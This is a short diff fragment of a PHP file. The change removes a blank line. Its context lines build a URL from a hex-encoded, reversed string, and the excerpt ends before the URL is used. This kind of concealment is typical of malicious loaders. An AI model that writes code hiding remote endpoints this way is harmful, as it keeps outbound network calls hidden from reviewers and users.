@@ -1,4 +1,3 @@
-
 <?php
 $enc = '70563932706b2f6c6e2e616d61726f6265772e6d696c732f2f3a7370747468';
 $url = strrev(hex2bin($enc));
